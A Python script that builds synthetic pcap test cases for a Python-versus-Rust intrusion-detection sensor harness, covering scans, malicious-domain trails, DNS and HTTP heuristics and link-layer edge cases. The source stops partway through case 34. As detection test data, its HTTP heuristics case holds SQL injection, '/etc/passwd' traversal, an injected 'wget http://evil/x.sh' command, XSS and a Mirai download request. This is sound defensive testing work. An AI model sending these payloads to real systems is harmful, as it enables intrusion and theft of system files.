#!/usr/bin/env python3
# coding: utf-8
"""Generate the replay corpus used by the Python-vs-Rust parity harness.

Pure stdlib pcap crafting (same approach as core/testing.py), so no scapy and no root are
needed. Every case is a separate pcap file plus a list of expected detection substrings, so
the harness can assert both

  * parity   - the two sensors produce the same normalized events, and
  * coverage - the traffic actually trips the detection it was built for.

    python3 sensor/tools/gen_corpus.py [--out DIR]
"""

import argparse
import json
import os
import socket
import struct
import sys

ROOT = os.path.abspath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))

DLT_EN10MB = 1
DLT_RAW = 12
DLT_LINUX_SLL = 113

BASE_SEC = 1700000000

# --- link / network / transport builders -----------------------------------------

def eth(payload, ethertype=0x0800, vlan=None):
    out = b"\xaa\xbb\xcc\xdd\xee\xff\x11\x22\x33\x44\x55\x66"
    if vlan is not None:
        out += b"\x81\x00" + struct.pack("!H", vlan)
    out += struct.pack("!H", ethertype)
    return out + payload


def pppoe(payload, ppp_proto=0x0021, vlan=None):
    """Ethernet -> PPPoE session (RFC 2516) -> PPP -> payload.

    What a SPAN port mirroring a DSL/fibre uplink actually carries. Both sensors used to drop it:
    ethertype 0x8864 matched neither the IPv4 nor the IPv6 check, and the IP-offset heuristic only
    runs for an UNKNOWN datalink, so a mirrored Ethernet port had no fallback (issue #19297).
    """
    body = struct.pack("!BBHH", 0x11, 0x00, 0xf5d7, len(payload) + 2) + struct.pack("!H", ppp_proto) + payload
    return eth(body, ethertype=0x8864, vlan=vlan)


def sll(payload, ethertype=0x0800):
    return struct.pack("!HHH", 0, 1, 6) + b"\x11\x22\x33\x44\x55\x66\x00\x00" + struct.pack("!H", ethertype) + payload


def ipv4(src, dst, proto, payload, ihl=5, frag=0, total_len=None):
    vihl = 0x40 | (ihl & 0x0f)
    options = b"\x00" * ((ihl - 5) * 4)
    total = total_len if total_len is not None else (ihl * 4 + len(payload))
    header = struct.pack("!BBHHHBBH4s4s", vihl, 0, total, 0x1234, frag, 64, proto, 0,
                         socket.inet_aton(src), socket.inet_aton(dst))
    return header + options + payload


def ipv6(src, dst, proto, payload):
    return (struct.pack("!IHBB", 0x60000000, len(payload), proto, 64)
            + socket.inet_pton(socket.AF_INET6, src)
            + socket.inet_pton(socket.AF_INET6, dst) + payload)


def tcp(sport, dport, flags, payload=b"", doff=5):
    return struct.pack("!HHIIBBHHH", sport, dport, 1, 1, (doff & 0x0f) << 4, flags, 65535, 0, 0) + payload


def udp(sport, dport, payload):
    return struct.pack("!HHHH", sport, dport, 8 + len(payload), 0) + payload


def icmp(type_=8):
    return struct.pack("!BBHHH", type_, 0, 0, 0x1234, 1)


# --- application payloads ---------------------------------------------------------

def dns_query(name, qtype=1, qclass=1, flags=0x0100, qdcount=1):
    q = b""
    for label in name.split('.'):
        q += struct.pack("!B", len(label)) + label.encode("ascii")
    q += b"\x00" + struct.pack("!HH", qtype, qclass)
    return struct.pack("!HHHHHH", 0x1337, flags, qdcount, 0, 0, 0) + q


def dns_response_a(name, answer, flags=0x8080, compressed=True):
    body = dns_query(name, flags=flags)
    if compressed:
        rr = b"\xc0\x0c"
    else:
        rr = b""
        for label in name.split('.'):
            rr += struct.pack("!B", len(label)) + label.encode("ascii")
        rr += b"\x00"
    rr += struct.pack("!HHIH", 1, 1, 60, 4) + socket.inet_aton(answer)
    header = struct.pack("!HHHHHH", 0x1337, flags, 1, 1, 0, 0)
    return header + body[12:] + rr


def dns_nxdomain(name):
    return dns_query(name, flags=0x8083)


def http_get(path, host=None, ua="curl/8.0", extra=""):
    lines = ["GET %s HTTP/1.1" % path]
    if host is not None:
        lines.append("Host: %s" % host)
    lines.append("User-Agent: %s" % ua)
    if extra:
        lines.append(extra)
    lines.append("Accept: */*")
    return ("\r\n".join(lines) + "\r\n\r\n").encode("ascii")


def http_post(path, host, body):
    return ("POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\n\r\n%s"
            % (path, host, len(body), body)).encode("ascii")


def http_response(headers, body=""):
    return ("%s\r\n\r\n%s" % (headers, body)).encode("ascii")


def tls_client_hello(sni, with_record=True):
    s = sni.encode("ascii")
    srv = b"\x00" + struct.pack("!H", len(s)) + s
    lst = struct.pack("!H", len(srv)) + srv
    ext = b"\x00\x00" + struct.pack("!H", len(lst)) + lst
    body = (b"\x03\x03" + b"\x11" * 32 + b"\x00" + b"\x00\x02\x13\x01"
            + b"\x01\x00" + struct.pack("!H", len(ext)) + ext)
    hs = b"\x01" + struct.pack("!I", len(body))[1:] + body
    if with_record:
        return b"\x16\x03\x03" + struct.pack("!H", len(hs)) + hs
    return hs


def quic_initial(sni, dcid=b"\x11\x22\x33\x44\x55\x66\x77\x88"):
    """A real QUIC v1 Initial carrying a ClientHello, keyed off the public DCID."""
    sys.path.insert(0, ROOT)
    from core import quic_sni

    hs = tls_client_hello(sni, with_record=False)
    frames = b"\x06\x00" + struct.pack("!H", 0x4000 | len(hs)) + hs
    frames += b"\x00" * max(0, 1200 - len(frames))

    key, iv, hp = quic_sni.derive_client_initial_keys(dcid, 1)
    pn, pn_len = 0, 1
    length = len(frames) + 16 + pn_len

    header = bytearray([0xc0 | (pn_len - 1)])
    header += struct.pack("!I", 1)
    header += bytes([len(dcid)]) + dcid
    header += b"\x00"                                   # scid len
    header += b"\x00"                                   # token length varint
    header += struct.pack("!H", 0x4000 | length)
    pn_offset = len(header)
    header += bytes([pn])

    nonce = bytearray(iv)
    pn_be = struct.pack("!Q", pn)
    for i in range(8):
        nonce[4 + i] ^= pn_be[i]
    counter0 = bytes(nonce) + struct.pack("!I", 2)
    ciphertext = quic_sni.aes_ctr_decrypt(key, counter0, frames)

    packet = bytearray(header) + ciphertext + b"\xaa" * 16
    sample = bytes(packet[pn_offset + 4:pn_offset + 20])
    mask = quic_sni.aes_ecb_block(hp, sample)
    packet[0] ^= mask[0] & 0x0f
    for i in range(pn_len):
        packet[pn_offset + i] ^= mask[1 + i]
    return bytes(packet)


# --- pcap writer ------------------------------------------------------------------

def write_pcap(path, packets, linktype=DLT_EN10MB):
    with open(path, "wb") as f:
        f.write(struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, linktype))
        for ts, packet in packets:
            usec = int(round((ts - int(ts)) * 1000000))
            f.write(struct.pack("<IIII", int(ts), usec, len(packet), len(packet)))
            f.write(packet)


# --- fixture trails ---------------------------------------------------------------

TRAILS = (
    ("evil-test-domain.com", "malware (test)", "(static)"),
    ("sub.evil-parent.com", "malware (test)", "(static)"),
    ("evil-parent.com", "malware (test)", "(static)"),
    ("badsite.onion", "malware (test)", "(static)"),
    ("evilname", "malware (test)", "(static)"),
    ("66.66.66.66", "malware (test)", "(static)"),
    ("6.6.6.6:8443", "malware (test)", "(static)"),
    ("7.7.7.7", "phishing (test)", "(static)"),
    ("198.51.100.53", "known attacker", "(static)"),        # a resolver IP that is NOT whitelisted
    ("203.0.113.44", "malware (test)", "(static)"),
    ("198.51.100.66", "botnet c2 (test)", "(static)"),
    ("/malicious-login.php", "malware (test)", "(static)"),
    ("evil-url.example/bad/path", "malware (test)", "(static)"),
    ("dead::beef", "malware (test)", "(static)"),
    ("[dead::beef]:443", "malware (test)", "(static)"),
    ("198.51.100.90", "sinkhole testsink (malware)", "(static)"),
    ("198.51.100.91", "parking site (suspicious)", "(static)"),
    ("dga[0-9]+\\.wildcard-test\\.com", "malware (test)", "(static)"),
    ("tls-evil.example", "malware (test)", "(static)"),
    ("quic-evil.example", "malware (test)", "(static)"),
)

# Counting heuristics only fire once the sensor's clock advances past the window, so they
# need the pcap record timestamps. sensor.py on Python 3 substitutes wall-clock time (a
# pcapy-ng workaround, see core/testing.py's own `pcap_ts_only` skip), so in strict-parity
# mode BOTH sensors stay silent here; the harness asserts these with --timestamps pcap.
TIMING_WINDOW_CASES = frozenset((
    "port_scan", "stealth_scan_null", "stealth_scan_fin", "stealth_scan_xmas",
    "udp_scan", "infection_scan", "web_scan",
))

# Cases whose event COUNT depends on which clock the sensor uses: burst suppression
# (_last_syn / _last_udp), the log-throttle bucket (sec // PROCESS_COUNT) and the hourly
# resets are all keyed on the packet's second. Replaying with real pcap timestamps is the
# correct behaviour and yields MORE events than sensor.py's wall-clock offline mode.
TIMESTAMP_SENSITIVE_CASES = TIMING_WINDOW_CASES | frozenset((
    "duplicate_syn", "repeated_detections", "cache_expiry",
))

# Deliberate divergences from old/sensor.py: case name -> the event substrings the RUST sensor is
# expected to produce and sensor.py is expected NOT to. parity.py treats exactly these as an
# expected surplus - and FAILS the case if the surplus is absent, so a silent revert of either fix
# breaks the harness instead of quietly restoring "parity" with a detection hole.
# See parity.py's DELIBERATE DIVERGENCES section for what each one is and why.
DIVERGENCE_CASES = {
    "udp_malware_dst": ["66.66.66.66"],
    "dns_same_socket_burst": ["evil-test-domain.com"],
}

ATTACKER = "10.0.0.66"
EXTERNAL = "203.0.113.9"
VICTIM = "198.51.100.7"


def build_cases():
    """Returns [(name, linktype, packets, expected_substrings, notes)]."""
    cases = []

    def frame(payload, linktype=DLT_EN10MB, vlan=None, ethertype=0x0800):
        if linktype == DLT_EN10MB:
            return eth(payload, ethertype=ethertype, vlan=vlan)
        if linktype == DLT_LINUX_SLL:
            return sll(payload, ethertype=ethertype)
        return payload

    # 1. ordinary, clean TCP traffic -> no detections
    packets = []
    for i in range(20):
        packets.append((BASE_SEC + i, frame(ipv4("10.0.0.5", "1.1.1.1", 6, tcp(50000 + i, 443, 0x02)))))
        packets.append((BASE_SEC + i, frame(ipv4("1.1.1.1", "10.0.0.5", 6, tcp(443, 50000 + i, 0x12)))))
    cases.append(("clean_tcp", DLT_EN10MB, packets, [], "ordinary TCP handshakes to a clean IP"))

    # 2. duplicate SYNs (burst suppression)
    packets = []
    for i in range(5):
        packets.append((BASE_SEC, frame(ipv4(ATTACKER, "66.66.66.66", 6, tcp(50001, 443, 0x02)))))
    for i in range(3):
        packets.append((BASE_SEC + 10 + i, frame(ipv4(ATTACKER, "66.66.66.66", 6, tcp(50001, 443, 0x02)))))
    cases.append(("duplicate_syn", DLT_EN10MB, packets, ["66.66.66.66", "malware (test)"],
                  "identical SYNs in one second must collapse"))

    # 3. IP / IP:port trails over TCP SYN
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "66.66.66.66", 6, tcp(50002, 443, 0x02)))),
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "6.6.6.6", 6, tcp(50003, 8443, 0x02)))),
        (BASE_SEC + 2, frame(ipv4("198.51.100.66", ATTACKER, 6, tcp(31337, 50004, 0x02)))),
    ]
    cases.append(("ip_trails", DLT_EN10MB, packets, ["66.66.66.66", "6.6.6.6:8443", "198.51.100.66"],
                  "IP and IP:port trails, inbound and outbound"))

    # 4. port scan (slow, sliding window)
    packets = []
    for i in range(20):
        packets.append((BASE_SEC + i, frame(ipv4(EXTERNAL, VICTIM, 6, tcp(40000 + i, 1000 + i, 0x02)))))
    packets.append((BASE_SEC + 25, frame(ipv4(EXTERNAL, "192.0.2.2", 17, udp(1, 2, b"\x00" * 8)))))
    cases.append(("port_scan", DLT_EN10MB, packets, ["potential port scanning"],
                  "20 ports over 20s: only the sliding window catches this"))

    # 5. stealth scans (NULL / FIN / XMAS)
    for flags, name in ((0x00, "null"), (0x01, "fin"), (0x29, "xmas")):
        packets = []
        for i in range(20):
            packets.append((BASE_SEC + i, frame(ipv4(EXTERNAL, VICTIM, 6, tcp(40000 + i, 2000 + i, flags)))))
        packets.append((BASE_SEC + 25, frame(ipv4(EXTERNAL, "192.0.2.2", 17, udp(1, 2, b"\x00" * 8)))))
        cases.append(("stealth_scan_%s" % name, DLT_EN10MB, packets, ["potential port scanning"],
                      "nmap -s%s" % name[0].upper()))

    # 6. ACK sweep must NOT be flagged
    packets = []
    for i in range(20):
        packets.append((BASE_SEC + i, frame(ipv4(EXTERNAL, VICTIM, 6, tcp(40000 + i, 3000 + i, 0x10)))))
    packets.append((BASE_SEC + 25, frame(ipv4(EXTERNAL, "192.0.2.2", 17, udp(1, 2, b"\x00" * 8)))))
    cases.append(("ack_sweep_no_fp", DLT_EN10MB, packets, [], "bare ACKs are normal traffic"))

    # 7. UDP scan
    packets = []
    for i in range(20):
        packets.append((BASE_SEC + i, frame(ipv4(EXTERNAL, VICTIM, 17, udp(40000 + i, 1000 + i, b"\x00" * 8)))))
    packets.append((BASE_SEC + 25, frame(ipv4(EXTERNAL, "192.0.2.2", 17, udp(1, 2, b"\x00" * 8)))))
    cases.append(("udp_scan", DLT_EN10MB, packets, ["potential udp scanning"], "nmap -sU"))

    # 8. infection scan (>32 hosts on port 445)
    packets = []
    for i in range(40):
        packets.append((BASE_SEC, frame(ipv4("10.0.0.5", "10.9.9.%d" % i, 6, tcp(53000 + i, 445, 0x02)))))
    packets.append((BASE_SEC + 2, frame(ipv4("10.0.0.5", "192.0.2.3", 17, udp(1, 2, b"flush")))))
    cases.append(("infection_scan", DLT_EN10MB, packets, ["potential infection"],
                  "40 distinct hosts on an infection port"))

    # 9. web scan (>10 distinct first path segments)
    packets = []
    for i in range(14):
        packets.append((BASE_SEC, frame(ipv4(EXTERNAL, VICTIM, 6,
                                             tcp(52000 + i, 80, 0x18, http_get("/scan%d/x" % i, "webscan.example"))))))
    packets.append((BASE_SEC + 2, frame(ipv4(EXTERNAL, "192.0.2.4", 17, udp(1, 2, b"flush")))))
    cases.append(("web_scan", DLT_EN10MB, packets, ["potential web scanning"], "path sweep from an external source"))

    # 10. DNS queries: exact, subdomain, onion, ip-adress.com, wildcard regex
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50000, 53, dns_query("evil-test-domain.com"))))),
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50001, 53, dns_query("www.evil-parent.com"))))),
        (BASE_SEC + 2, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50002, 53, dns_query("badsite.onion.to"))))),
        (BASE_SEC + 3, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50003, 53, dns_query("evilname.ip-adress.com"))))),
        (BASE_SEC + 4, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50004, 53, dns_query("dga1234.wildcard-test.com"))))),
        (BASE_SEC + 5, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50005, 53, dns_query("clean.example.org"))))),
    ]
    cases.append(("dns_queries", DLT_EN10MB, packets,
                  ["evil-test-domain.com", "(www).evil-parent.com", "badsite.onion(.to)",
                   "evilname(.ip-adress.com)", "dga1234.wildcard-test.com"],
                  "exact / parent / onion / ip-adress.com / wildcard-regex domain trails"))

    # 11. DNS query to a bad resolver IP, and a PTR/AAAA query that must be skipped
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "198.51.100.53", 17, udp(50006, 53, dns_query("whatever.com"))))),
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "198.51.100.53", 17, udp(50007, 53, dns_query("skipme.com", qtype=28))))),
        (BASE_SEC + 2, frame(ipv4(ATTACKER, "198.51.100.53", 17, udp(50008, 53, dns_query("skipme2.com", qtype=12))))),
    ]
    cases.append(("dns_resolver_trail", DLT_EN10MB, packets, ["198.51.100.53", "whatever.com"],
                  "AAAA/PTR queries are excluded from the IP-trail check"))

    # 12. DNS responses: sinkholed and parked A records, compressed and uncompressed names
    packets = [
        (BASE_SEC, frame(ipv4("8.8.8.8", ATTACKER, 17,
                              udp(53, 50010, dns_response_a("sinkholed.com", "198.51.100.90", compressed=True))))),
        (BASE_SEC + 1, frame(ipv4("8.8.8.8", ATTACKER, 17,
                                  udp(53, 50011, dns_response_a("parked.com", "198.51.100.91", compressed=False))))),
    ]
    cases.append(("dns_responses", DLT_EN10MB, packets, ["sinkholed by testsink", "parked site"],
                  "A-record answer walk over compressed and uncompressed names"))

    # 13. malformed DNS must be silent and must not crash
    malformed = [
        struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0),
        struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0) + b"\x04evil\x03com",
        struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0) + b"\x3f" + b"A" * 5,
        struct.pack("!HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0) + b"\xc0\x0c",
        struct.pack("!HHHHHH", 0x1234, 0x8080, 1, 1, 0, 0) + b"\x04evil\x03com\x00" + struct.pack("!HH", 1, 1),
        b"\x00\x01\x02",
        b"",
    ]
    packets = [(BASE_SEC + i, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50020 + i, 53, p))))
               for i, p in enumerate(malformed)]
    cases.append(("dns_malformed", DLT_EN10MB, packets, [], "truncated / hostile DNS"))

    # 14. NXDOMAIN flood -> excessive no such domain
    packets = []
    for i in range(25):
        # NOTE: the client port varies per query (as a real resolver client does). With one
        # fixed 5-tuple, sensor.py's _last_udp burst suppression collapses the whole flood
        # into a single packet once offline timestamps are wall-clock.
        packets.append((BASE_SEC + i, frame(ipv4("8.8.8.8", "203.0.113.5", 17,
                                                 udp(53, 40000 + i, dns_nxdomain("nx%d.dgaparent.com" % i))))))
    cases.append(("dns_nxdomain_flood", DLT_EN10MB, packets, ["excessive no such domain"],
                  "hour-bucketed NXDOMAIN counters"))

    # 15. DGA-looking NXDOMAIN (entropy / consonant thresholds)
    packets = [
        (BASE_SEC, frame(ipv4("8.8.8.8", "203.0.113.5", 17, udp(53, 40001, dns_nxdomain("xkqwzlvbnmfghjd.com"))))),
        (BASE_SEC + 1, frame(ipv4("8.8.8.8", "203.0.113.5", 17, udp(53, 40002, dns_nxdomain("google.com"))))),
    ]
    cases.append(("dns_dga_labels", DLT_EN10MB, packets, ["no such domain (suspicious)"],
                  "entropy/consonant DGA heuristics"))

    # 16. DNS exhaustion (many distinct subdomains in one window)
    packets = []
    for i in range(40):
        packets.append((BASE_SEC + i // 8, frame(ipv4(ATTACKER, "8.8.8.8", 17,
                                                      udp(50100 + i, 53, dns_query("s%d.tunnel.com" % i))))))
    cases.append(("dns_exhaustion", DLT_EN10MB, packets, [],
                  "below the 1000-subdomain threshold: must stay silent"))

    # 17. HTTP: URL trail, Host trail, dst-IP annotation
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "203.0.113.10", 6,
                              tcp(50030, 80, 0x18, http_get("/malicious-login.php", "victim.example"))))),
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "203.0.113.44", 6,
                                  tcp(50031, 80, 0x18, http_get("/", "hostcheck.example"))))),
        (BASE_SEC + 2, frame(ipv4(ATTACKER, "203.0.113.11", 6,
                                  tcp(50032, 80, 0x18, http_get("/bad/path", "evil-url.example"))))),
    ]
    cases.append(("http_trails", DLT_EN10MB, packets,
                  ["malicious-login.php", "203.0.113.44", "hostcheck.example", "evil-url.example"],
                  "URL-path trail, host-annotated IP trail, host+path trail"))

    # 18. HTTP heuristics
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "203.0.113.12", 6, tcp(50040, 80, 0x18, http_get(
            "/items.php?id=1%20UNION%20ALL%20SELECT%20username,password%20FROM%20users", "sqli.example"))))),
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "203.0.113.13", 6, tcp(50041, 80, 0x18, http_get(
            "/download?file=../../../../etc/passwd", "trav.example"))))),
        (BASE_SEC + 2, frame(ipv4(ATTACKER, "203.0.113.14", 6, tcp(50042, 80, 0x18, http_get(
            "/cgi?cmd=;cat%20/etc/passwd;wget%20http://evil/x.sh", "rce.example"))))),
        (BASE_SEC + 3, frame(ipv4(ATTACKER, "203.0.113.15", 6, tcp(50043, 80, 0x18, http_get(
            "/search?q=<script>alert(1)</script>", "xss.example"))))),
        (BASE_SEC + 4, frame(ipv4(ATTACKER, "203.0.113.16", 6, tcp(50044, 80, 0x18, http_post(
            "/submit", "postsqli.example", "q=1 UNION ALL SELECT pwd FROM users"))))),
        (BASE_SEC + 5, frame(ipv4(ATTACKER, "198.51.100.99", 6, tcp(50045, 80, 0x18, http_get(
            "/mirai.x86", "198.51.100.99"))))),
        (BASE_SEC + 6, frame(ipv4(ATTACKER, "203.0.113.17", 6, tcp(50046, 80, 0x18, http_get(
            "http://proxycheck.example/", "203.0.113.17"))))),
        (BASE_SEC + 7, frame(ipv4(ATTACKER, "203.0.113.18", 6, tcp(50047, 80, 0x18, http_get(
            "/setup.exe", "dl.example"))))),
        (BASE_SEC + 8, frame(ipv4(ATTACKER, "203.0.113.19", 6, tcp(50048, 80, 0x18, http_get(
            "/x", "ua.example", ua="masscan/1.0"))))),
    ]
    cases.append(("http_heuristics", DLT_EN10MB, packets,
                  ["potential sql injection", "potential directory traversal", "potential remote code execution",
                   "potential xss injection", "potential iot-malware download", "potential proxy probe",
                   "direct .exe download", "user agent (suspicious)"],
                  "the suspicious-request regex battery"))

    # 19. HTTP responses: sinkhole banner, suspicious content type, seized title
    packets = [
        (BASE_SEC, frame(ipv4("203.0.113.20", ATTACKER, 6, tcp(80, 50050, 0x18,
                                                              http_response("HTTP/1.1 200 OK\r\nServer: sinkhole"))))),
        (BASE_SEC + 1, frame(ipv4("203.0.113.21", ATTACKER, 6, tcp(80, 50051, 0x18, http_response(
            "HTTP/1.1 200 OK\r\nContent-Type: application/x-sh", "#!/bin/sh"))))),
        (BASE_SEC + 2, frame(ipv4("203.0.113.22", ATTACKER, 6, tcp(80, 50052, 0x18, http_response(
            "HTTP/1.1 200 OK\r\nContent-Type: text/html",
            "<html><head><title>This domain name has been seized by the FBI</title></head></html>"))))),
    ]
    cases.append(("http_responses", DLT_EN10MB, packets,
                  ["sinkhole response", "content type (suspicious)", "seized domain"],
                  "response-side heuristics"))

    # 20. truncated / hostile packets
    packets = []
    for i, body in enumerate([b"", b"\x45", b"\x45\x00", b"\x45" + b"\x00" * 18, b"\x60" + b"\x00" * 30,
                              b"\x00" * 40, b"\x30" * 40, b"\xff" * 60]):
        packets.append((BASE_SEC + i, frame(body)))
    # a TCP header cut in half, and an IPv4 header claiming IHL=15 with nothing behind it
    packets.append((BASE_SEC + 10, frame(ipv4(ATTACKER, "66.66.66.66", 6, b"\x00" * 6))))
    packets.append((BASE_SEC + 11, frame(ipv4(ATTACKER, "66.66.66.66", 6, b"", ihl=15))))
    cases.append(("truncated", DLT_EN10MB, packets, [], "must never crash and must stay quiet"))

    # 21. VLAN-tagged traffic
    packets = [
        (BASE_SEC, eth(ipv4(ATTACKER, "66.66.66.66", 6, tcp(50060, 443, 0x02)), vlan=100)),
        (BASE_SEC + 1, eth(ipv4(ATTACKER, "8.8.8.8", 17, udp(50061, 53, dns_query("evil-test-domain.com"))), vlan=100)),
        # QinQ: both sensors drop it (only one 0x8100 tag is skipped)
        (BASE_SEC + 2, b"\xaa" * 12 + b"\x81\x00\x00d" + b"\x81\x00\x00e" + b"\x08\x00"
         + ipv4(ATTACKER, "66.66.66.66", 6, tcp(50062, 443, 0x02))),
    ]
    cases.append(("vlan", DLT_EN10MB, packets, ["66.66.66.66", "evil-test-domain.com"],
                  "single 802.1Q tag is followed; QinQ is dropped by both"))

    # 22. IPv4 fragments
    payload = tcp(50070, 443, 0x02)
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "66.66.66.66", 6, payload, frag=0x2000))),   # first fragment (MF)
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "66.66.66.66", 6, b"\x00" * 8, frag=0x0001))),  # non-first
        (BASE_SEC + 2, frame(ipv4(ATTACKER, "66.66.66.66", 6, b"\x00" * 8, frag=0x00b9))),
    ]
    cases.append(("fragments", DLT_EN10MB, packets, ["66.66.66.66"],
                  "first fragment is processed, later fragments are skipped"))

    # 23. IPv6
    packets = [
        (BASE_SEC, frame(ipv6("dead::1", "dead::beef", 6, tcp(50080, 443, 0x02)), ethertype=0x86dd)),
        (BASE_SEC + 1, frame(ipv6("dead::1", "dead::2", 17,
                                  udp(50081, 53, dns_query("evil-test-domain.com"))), ethertype=0x86dd)),
        (BASE_SEC + 2, frame(ipv6("dead::1", "dead::beef", 58, icmp(0x80)), ethertype=0x86dd)),
    ]
    cases.append(("ipv6", DLT_EN10MB, packets, ["dead::beef", "evil-test-domain.com"],
                  "IPv6 SYN, DNS and ICMPv6 echo"))

    # 24. ICMP
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "66.66.66.66", 1, icmp(8)))),
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "66.66.66.66", 1, icmp(0)))),   # echo reply: ignored
    ]
    cases.append(("icmp", DLT_EN10MB, packets, ["66.66.66.66", "ICMP"], "only echo requests count"))

    # 25. repeated detections (log throttling)
    packets = []
    for i in range(30):
        packets.append((BASE_SEC + i, frame(ipv4(ATTACKER, "8.8.8.8", 17,
                                                 udp(50200 + i, 53, dns_query("evil-test-domain.com"))))))
    cases.append(("repeated_detections", DLT_EN10MB, packets, ["evil-test-domain.com"],
                  "same trail repeatedly: the throttle window must collapse it"))

    # 26. cache expiration / clean-domain caching
    packets = []
    for i in range(5):
        packets.append((BASE_SEC + i * 4000, frame(ipv4(ATTACKER, "8.8.8.8", 17,
                                                        udp(50300 + i, 53, dns_query("clean-cached.example"))))))
        packets.append((BASE_SEC + i * 4000 + 1, frame(ipv4(ATTACKER, "8.8.8.8", 17,
                                                            udp(50310 + i, 53, dns_query("evil-test-domain.com"))))))
    cases.append(("cache_expiry", DLT_EN10MB, packets, ["evil-test-domain.com"],
                  "hour-crossing timestamps exercise the hourly resets"))

    # 27. TLS SNI (only detected with USE_FAST_PREFILTER)
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "203.0.113.30", 6, tcp(50400, 443, 0x18, tls_client_hello("tls-evil.example"))))),
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "203.0.113.31", 6, tcp(50401, 443, 0x18, tls_client_hello("clean.example"))))),
    ]
    cases.append(("tls_sni", DLT_EN10MB, packets, ["tls-evil.example"],
                  "TLS ClientHello SNI (needs USE_FAST_PREFILTER; the harness enables it)"))

    # 28. QUIC Initial SNI (opt-in as above)
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "203.0.113.32", 17, udp(50410, 443, quic_initial("quic-evil.example"))))),
    ]
    cases.append(("quic_sni", DLT_EN10MB, packets, ["quic-evil.example"],
                  "QUIC Initial SNI (needs USE_FAST_PREFILTER; the harness enables it)"))

    # 29. raw-IP and LINUX_SLL link types
    packets = [(BASE_SEC, ipv4(ATTACKER, "66.66.66.66", 6, tcp(50500, 443, 0x02)))]
    cases.append(("dlt_raw", DLT_RAW, packets, ["66.66.66.66"], "DLT_RAW (no link header)"))
    packets = [(BASE_SEC, sll(ipv4(ATTACKER, "66.66.66.66", 6, tcp(50501, 443, 0x02))))]
    cases.append(("dlt_sll", DLT_LINUX_SLL, packets, ["66.66.66.66"], "DLT_LINUX_SLL ('any' interface)"))

    # 29b. PPPoE-encapsulated IP, plain and behind a VLAN tag
    packets = [
        (BASE_SEC, pppoe(ipv4(ATTACKER, "66.66.66.66", 6, tcp(50502, 443, 0x02)))),
        (BASE_SEC + 1, pppoe(ipv4(ATTACKER, "66.66.66.66", 6, tcp(50503, 443, 0x02)), vlan=100)),
        # PPP control traffic carries no IP and must stay silent rather than being misparsed.
        (BASE_SEC + 2, pppoe(ipv4(ATTACKER, "6.6.6.6", 6, tcp(50504, 443, 0x02)), ppp_proto=0xc021)),
    ]
    cases.append(("pppoe", DLT_EN10MB, packets, ["66.66.66.66"],
                  "PPPoE session encapsulation (a mirrored DSL/fibre uplink)"))

    # 30. IPv4 options (IHL > 5)
    packets = [(BASE_SEC, frame(ipv4(ATTACKER, "66.66.66.66", 6, tcp(50600, 443, 0x02), ihl=6)))]
    cases.append(("ipv4_options", DLT_EN10MB, packets, ["66.66.66.66"], "IHL=6 must shift the transport offset"))

    # 31. whitelisted destinations stay silent
    packets = [
        (BASE_SEC, frame(ipv4("127.0.0.1", "127.0.0.1", 6, tcp(50700, 443, 0x02)))),
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50701, 53, dns_query("localhost.localdomain"))))),
    ]
    cases.append(("whitelisted", DLT_EN10MB, packets, [], "whitelist and ignore-suffix handling"))

    # 32. ignored DNS suffixes (".example", ".local", ".arpa", ...) must stay silent even
    #     though the name matches a trail-like pattern
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50800, 53, dns_query("dga1234.example"))))),
        (BASE_SEC + 1, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50801, 53, dns_query("host.local"))))),
        (BASE_SEC + 2, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50802, 53, dns_query("1.0.0.127.in-addr.arpa"))))),
        (BASE_SEC + 3, frame(ipv4(ATTACKER, "8.8.8.8", 17, udp(50803, 53, dns_query("x.intranet.corp"))))),
    ]
    cases.append(("dns_ignored_suffixes", DLT_EN10MB, packets, [],
                  "IGNORE_DNS_QUERY_SUFFIXES / '.intranet.' guards"))

    # 33. UDP to a malware-labelled DESTINATION. sensor.py looks the destination up, falls back to
    #     the source, then applies ONE `"malware" not in info` test to whichever matched - so this
    #     datagram, to a known C2 address, produces nothing at all. Its own TCP path does not do
    #     that (it suppresses "attacker" on the destination side and "malware" only on the source
    #     side), and the Rust sensor now follows the TCP rule here too. Expected Rust-only event.
    packets = [
        (BASE_SEC, frame(ipv4(ATTACKER, "66.66.66.66", 17, udp(50900, 4444, b"\x00" * 16)))),
    ]
    cases.append(("udp_malware_dst", DLT_EN10MB, packets, ["66.66.66.66"],
                  "non-DNS UDP to a malware-labelled destination (deliberate divergence)"))

    # 34. Two DIFFERENT DNS queries back-to-back on one socket in one second. sensor.py's burst
    #     filter compares (second, 5-tuple) and runs BEFORE the DNS parser, so the second datagram
